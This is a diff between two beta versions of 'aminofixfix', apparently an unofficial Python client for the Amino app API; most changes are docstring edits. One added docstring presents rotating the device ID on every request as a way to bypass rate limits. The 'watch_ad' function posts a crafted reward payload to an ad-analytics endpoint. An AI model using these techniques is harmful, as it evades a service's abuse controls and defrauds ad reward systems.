             - **embedContent** : Content of the Embed. Works only in AttachedObject Embeds.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if message is not None and file is None:
             message = message.replace("<$", "‎‏").replace("$>", "‬‭")
 
         mentions = []
         if mentionUserIds:
@@ -927,15 +927,15 @@
             - **chatId** : ID of the Chat.
             - **asStaff** : If execute as a Staff member (Leader or Curator).
             - **reason** : Reason of the action to show on the Moderation History.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "adminOpName": 102,
             # "adminOpNote": {"content": reason},
             "timestamp": int(timestamp() * 1000)
         }
         if asStaff and reason:
@@ -956,15 +956,15 @@
         **Parameters**
             - **messageId** : ID of the Message.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "messageId": messageId,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = await self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/mark-as-read", headers=self.additional_headers(data=data), data=data)
@@ -993,15 +993,15 @@
             - **publishToGlobal** : If the Chat should show on Public Chats or not.
             - **doNotDisturb** : If the Chat should Do Not Disturb or not.
             - **pinChat** : If the Chat should Pinned or not.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
 
         if title: data["title"] = title
         if content: data["content"] = content
         if icon: data["icon"] = icon
         if keywords: data["keywords"] = keywords
@@ -1134,15 +1134,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     async def leave_chat(self, chatId: str):
@@ -1151,15 +1151,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
         
     async def delete_chat(self, chatId: str):
@@ -1168,15 +1168,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
         
     async def subscribe(self, userId: str, autoRenew: str = False, transactionId: str = None):
@@ -1294,15 +1294,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`User Object <amino.lib.util.objects.UserProfile>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfile(response.json()["userProfile"]).UserProfile
 
     async def get_user_following(self, userId: str, start: int = 0, size: int = 25):
@@ -1313,15 +1313,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}/joined?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     async def get_user_followers(self, userId: str, start: int = 0, size: int = 25):
@@ -1332,15 +1332,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}/member?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     async def get_user_visitors(self, userId: str, start: int = 0, size: int = 25):
@@ -1351,15 +1351,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Visitors List <amino.lib.util.objects.visitorsList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}/visitors?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.VisitorsList(response.json()).VisitorsList
 
     async def get_user_checkins(self, userId: str):
@@ -1399,15 +1399,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Users List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     async def get_blocker_users(self, start: int = 0, size: int = 25):
@@ -1417,15 +1417,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List of User IDs <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         response = await self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()["blockerUidList"]
 
@@ -1495,15 +1495,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/chat/thread?type=joined-me&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.ThreadList(response.json()["threadList"]).ThreadList
 
     async def get_public_chat_threads(self, type: str = "recommended", start: int = 0, size: int = 25):
@@ -1513,15 +1513,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/chat/thread?type=public-all&filterType={type}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.ThreadList(response.json()["threadList"]).ThreadList
 
     async def get_chat_thread(self, chatId: str):
@@ -1530,15 +1530,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : :meth:`Chat Object <amino.lib.util.objects.Thread>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.Thread(response.json()["thread"]).Thread
 
     async def get_chat_messages(self, chatId: str, size: int = 25, pageToken: str = None):
@@ -1549,15 +1549,15 @@
             - **chatId** : ID of the Chat.
             - *size* : Size of the list.
             - *pageToken* : Next Page Token.
 
         **Returns**
             - **Success** : :meth:`Message List <amino.lib.util.objects.MessageList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if pageToken is not None: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
         else: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"
 
         response = await self.session.get(url, headers=self.additional_headers())
         if response.status_code != 200: 
@@ -1571,15 +1571,15 @@
         **Parameters**
             - **chatId** : ID of the Chat.
             - **message** : ID of the Message.
 
         **Returns**
             - **Success** : :meth:`Message Object <amino.lib.util.objects.Message>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.Message(response.json()["message"]).Message
 
     async def get_blog_info(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None):
@@ -1648,15 +1648,15 @@
                 - ``newest``, ``oldest``, ``top``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Comments List <amino.lib.util.objects.CommentList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if sorting == "newest": sorting = "newest"
         elif sorting == "oldest": sorting = "oldest"
         elif sorting == "top": sorting = "vote"
         else: raise exceptions.WrongType(sorting)
 
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
@@ -2131,15 +2131,15 @@
         **Parameters**
             - **avatarId** : ID of the avatar frame.
             - **applyToAll** : Apply to all.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
 
         """
 
         data = {"frameId": avatarId,
                 "applyToAll": 0,
                 "timestamp": int(timestamp() * 1000)}
 
@@ -2158,15 +2158,15 @@
         **Parameters**
             - **chatId** - ID of the Chat
             - **userId** - ID of the User
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "uid": userId
         })
 
         response = await self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/vvchat-presenter/invite/", headers=self.additional_headers(data=data), data=data)
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/client.py` & `amino.fix.fix-1.0.6b2/aminofixfix/client.py`

 * *Files 4% similar despite different names*

```diff
@@ -16,28 +16,82 @@
 
 from .lib.helpers import gen_deviceId
 from .lib.facades import RequestsClient
 from .socket import Callbacks, SocketHandler
 from .lib import exceptions, headers, objects, helpers
 
 class Client(Callbacks, SocketHandler):
+    """
+        Client to work with global in Amino.
+        (aminoapps.com)
+    """
     def __init__(
         self,
-        deviceId: str = None, userAgent: str = None, proxies: dict = None,
-        socket_trace = False, socketDebugging = False, socket_enabled = True,
-        autoDevice = False, http2_enabled: bool = True,
+        deviceId: str = None, userAgent: str = None, proxies: str | dict = None,
+        socket_trace: bool = False, socketDebugging: bool = False, socket_enabled: bool = True,
+        autoDevice: bool = False, http2_enabled: bool = True,
         
         disable_timeout: bool = False,
         default_timeout: int | None = 30, own_timeout: TimeoutConfig | None = None,
 
         connect_timeout: int | None = None, pool_timeout: int | None = None,
         read_timeout: int | None = None, write_timeout: int | None = None,
 
         api_library: objects.APILibraries = objects.APILibraries.HTTPX
     ):
+        """
+        Init client.
+
+        Accepting:
+        - deviceId: str
+        - userAgent: str
+        - proxies: str | dict 
+            - str support in beta
+        - socket_trace: bool = False
+            - recieving all things that socket doing
+        - socketDebugging: bool = False
+            - socket printing results of its work
+        - socket_enabled: bool = True
+            - enabling socket or not
+            - useful for scripts
+        - autoDevice: bool = False
+            - changing deviceId every request
+            - *can* or *can not* help with "too many requests" bypass
+        - http2_enabled: bool = True
+            - only for HTTPX
+            - just in case if Amino servers will some day support it
+        - disable_timeout: bool = False
+            - only for HTTPX (for now)
+            - completely disable timeouts if true
+            - **can cause issues!**
+        - default_timeout: int | None = 30
+            - only for HTTPX (for now)
+            - default timeout in seconds
+        - own_timeout: TimeoutConfig | None = None
+            - only for HTTPX (for now)
+            - own timeout configs
+        - connect_timeout: int | None = None
+            - only for HTTPX (for now)
+            - connect timeout (if you want configure timeout like this)
+        - pool_timeout: int | None = None
+            - only for HTTPX (for now)
+            - pool timeout (if you want configure timeout like this)
+        - read_timeout: int | None = None
+            - only for HTTPX (for now)
+            - read timeout (if you want configure timeout like this)
+        - write_timeout: int | None = None
+            - only for HTTPX (for now)
+            - write timeout (if you want configure timeout like this)
+        - api_library: objects.APILibraries = objects.APILibraries.HTTPX
+            - choicing library for API requests
+            - can be useful if you have troubles with HTTPX
+            - *can* be not so stable as HTTPX
+            - you can choice library like `aminofixfix.lib.objects.APILibraries.HTTPX`,
+              but you probably want to import `objects` from `aminofixfix.lib`
+        """
         self.api = "https://service.aminoapps.com/api/v1"
         self.proxies = proxies
         self.configured = False
         self.authenticated = False
         self.autoDevice = autoDevice
         self.http2_enabled = http2_enabled
         self.socket_enabled = socket_enabled
@@ -87,24 +141,45 @@
         self.account: objects.UserProfile = objects.UserProfile(None)
         self.profile: objects.UserProfile = objects.UserProfile(None)
 
         self.stop_loop = False
         self.active_live_chats = []
 
     def additional_headers(self, data: str = None, content_type: str = None):
+        """
+        Function to make additional headers, that API needs.
+
+        Accepting:
+        - data: str
+        - content_type: str
+
+        Recieving:
+        - object `dict`
+        """
         return headers.additionals(
             data=data,
             content_type=content_type,
             user_agent=self.user_agent,
             sid=self.sid,
             auid=self.userId,
             deviceId=gen_deviceId() if self.autoDevice else self.device_id
         )
 
     def activity_status(self, status: str):
+        """
+        Sets your activity status to offline or online.
+
+        Accepting:
+        - status: str
+            - only "on" or "off"
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if "on" in status.lower(): status = 1
         elif "off" in status.lower(): status = 2
         else: raise exceptions.WrongType(status)
 
         data = dumps({
             "onlineStatus": status,
             "duration": 86400,
@@ -158,14 +233,20 @@
             },
             "t": 108
         }
         data = dumps(data)
         self.send(data)
 
     def join_video_chat_as_viewer(self, comId: str, chatId: str):
+        """
+        Joins a Video Chat
+        **Parameters**
+            - **comId** : ID of the Community
+            - **chatId** : ID of the Chat
+        """
         data = {
             "o":
                 {
                     "ndcId": int(comId),
                     "threadId": chatId,
                     "joinRole": 2,
                     "id": "72446"
@@ -173,18 +254,30 @@
             "t": 112
         }
         data = dumps(data)
         self.send(data)
     
     # Fixed by vedansh#4039
     def leave_from_live_chat(self, chatId: str):
+        """
+        Leaves from a Live Chat
+        **Parameters**
+            - **chatId** : ID of the Chat
+        """
         if chatId in self.active_live_chats:
             self.active_live_chats.remove(chatId)
 
-    def run_vc(self, comId: str, chatId: str, joinType: str):
+    def run_vc(self, comId: str, chatId: str, joinType: str = 1):
+        """
+        Run a Video Chat
+        **Parameters**
+            - **comId** : ID of the Community
+            - **chatId** : ID of the Chat
+            - **joinType** : Join Type
+        """
         while chatId in self.active_live_chats and not self.stop_loop:
             data = {
                 "o": {
                     "ndcId": int(comId),
                     "threadId": chatId,
                     "joinRole": joinType,
                     "id": "2154531"  # Need to change?
@@ -194,14 +287,21 @@
             data = dumps(data)
             self.send(data)
             sleep(60)
             if self.stop_loop:
                 break
 
     def start_vc(self, comId: str, chatId: str, joinType: int = 1):
+        """
+        Start a Video Chat
+        **Parameters**
+            - **comId** : ID of the Community
+            - **chatId** : ID of the Chat
+            - **joinType** : Join Type
+        """
         data = {
             "o": {
                 "ndcId": int(comId),
                 "threadId": chatId,
                 "joinRole": joinType,
                 "id": "2154531"  # Need to change?
             },
@@ -220,14 +320,21 @@
         }
         data = dumps(data)
         self.send(data)
         self.active_live_chats.append(chatId)
         Thread(target=lambda: self.run_vc(comId, chatId, joinType)).start()
 
     def end_vc(self, comId: str, chatId: str, joinType: int = 2):
+        """
+        End a Video Chat
+        **Parameters**
+            - **comId** : ID of the Community
+            - **chatId** : ID of the Chat
+            - **joinType** : Join Type
+        """
         self.leave_from_live_chat(chatId)
         data = {
             "o": {
                 "ndcId": int(comId),
                 "threadId": chatId,
                 "joinRole": joinType,
                 "id": "2154531"  # Need to change?
@@ -264,15 +371,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "email": email,
             "v": 2,
             "secret": f"0 {password}",
             "deviceID": self.device_id,
@@ -304,15 +411,15 @@
         **Parameters**
             - **phoneNumber** : Phone number of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "phoneNumber": phoneNumber,
             "v": 2,
             "secret": f"0 {password}",
             "deviceID": self.device_id,
             "clientType": 300,
@@ -345,15 +452,15 @@
 
         **Parameters**
             - **secret** : Secret of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "v": 2,
             "secret": secret,
             "deviceID": self.device_id,
             "clientType": 100,
             "action": "normal",
@@ -388,15 +495,15 @@
             - **password** : Password of the account.
             - **verificationCode** : Verification code.
             - **deviceId** : The device id being registered to.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if deviceId == None: deviceId = self.device_id
 
         data = dumps({
             "secret": f"0 {password}",
             "deviceID": deviceId,
@@ -432,15 +539,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "secret": f"0 {password}",
             "deviceID": self.device_id,
             "email": email,
             "timestamp": int(timestamp() * 1000)
         })
@@ -457,15 +564,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "deviceID": self.device_id,
             "clientType": 100,
             "timestamp": int(timestamp() * 1000)
         })
 
@@ -494,15 +601,15 @@
             - **age** : Age of the account. Minimum is 13.
             - **gender** : Gender of the account.
                 - ``Male``, ``Female`` or ``Non-Binary``
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if gender.lower() == "male": gender = 1
         elif gender.lower() == "female": gender = 2
         elif gender.lower() == "non-binary": gender = 255
         else: raise exceptions.SpecifyType()
 
         if age <= 12: raise exceptions.AgeTooLow()
@@ -526,15 +633,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "validationContext": {
                 "type": 1,
                 "identity": email,
                 "data": {"code": code}},
             "deviceID": self.device_id,
@@ -554,15 +661,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **resetPassword** : If the code should be for Password Reset.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "identity": email,
             "type": 1,
             "deviceID": self.device_id
         }
 
@@ -584,15 +691,15 @@
         **Parameters**
             - **email** : Email of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "type": 1,
             "identity": email,
             "data": {"code": code},
             "deviceID": self.device_id
@@ -611,15 +718,15 @@
 
         **Parameters**
             - **password** : Password of the account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "deviceID": self.device_id,
             "secret": f"0 {password}"
         })
 
@@ -637,15 +744,15 @@
             - **email** : Email of the account.
             - **password** : Password of the account.
             - **code** : Verification code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "updateSecret": f"0 {password}",
             "emailValidationContext": {
                 "data": {
                     "code": code
@@ -671,15 +778,15 @@
 
         **Parameters**
             - **deviceId** : ID of the Device.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "deviceID": deviceId,
             "bundleID": "com.narvii.amino.master",
             "clientType": 100,
             "timezone": -timezone // 1000,
             "systemPushEnabled": True,
@@ -690,14 +797,21 @@
         response = self.session.post(f"/g/s/device", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             self.configured = True; return response.status_code
 
     def get_account_info(self):
+        """
+        Getting account info about you.
+
+        Recieving:
+        - object `UserProfile`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/g/s/account", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfile(response.json()["account"]).UserProfile
 
     def upload_media(self, file: BinaryIO, fileType: str):
@@ -706,15 +820,15 @@
 
         **Parameters**
             - **file** : File to be uploaded.
 
         **Returns**
             - **Success** : Url of the file uploaded to the server.
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if fileType == "audio":
             t = "audio/aac"
         elif fileType == "image":
             t = "image/jpg"
         else: raise exceptions.SpecifyType(fileType)
 
@@ -743,24 +857,37 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if not self.authenticated: raise exceptions.NotLoggedIn()
         response = self.session.get(f"/g/s/community/joined?v=1&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["communityList"]).CommunityList
 
     def sub_clients_profile(self, start: int = 0, size: int = 25):
+        """
+        Getting your profiles in communities.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if not self.authenticated: raise exceptions.NotLoggedIn()
         response = self.session.get(f"/g/s/community/joined?v=1&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["userInfoInCommunities"]
 
@@ -770,23 +897,26 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`User Object <amino.lib.util.objects.UserProfile>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/user-profile/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfile(response.json()["userProfile"]).UserProfile
 
     def watch_ad(self, userId: str = None):
+        """
+        Is this funcction even works?
+        """
         data = dumps(headers.Tapjoy(userId if userId else self.userId).data) 
         response = self.session.post("https://ads.tapdaq.com/v4/analytics/reward", data=data, headers=headers.Tapjoy().headers)
         if response.status_code != 204: return exceptions.CheckException(response)
         else: return response.status_code
 
     def get_chat_threads(self, start: int = 0, size: int = 25):
         """
@@ -795,15 +925,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/chat/thread?type=joined-me&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.ThreadList(response.json()["threadList"]).ThreadList
 
@@ -813,23 +943,37 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : :meth:`Chat Object <amino.lib.util.objects.Thread>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/g/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Thread(response.json()["thread"]).Thread
 
     def get_chat_users(self, chatId: str, start: int = 0, size: int = 25):
+        """
+        Getting users in chat.
+
+        Accepting:
+        - chatId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/g/s/chat/thread/{chatId}/member?start={start}&size={size}&type=default&cv=1.2", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["memberList"]).UserProfileList
 
     def join_chat(self, chatId: str):
@@ -838,15 +982,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/g/s/chat/thread/{chatId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -856,15 +1000,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/g/s/chat/thread/{chatId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -879,15 +1023,15 @@
             - **content** : Content of Group Chat.
             - **isGlobal** : If Group Chat is Global.
             - **publishToGlobal** : If Group Chat should show in Global.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str): userIds = [userId]
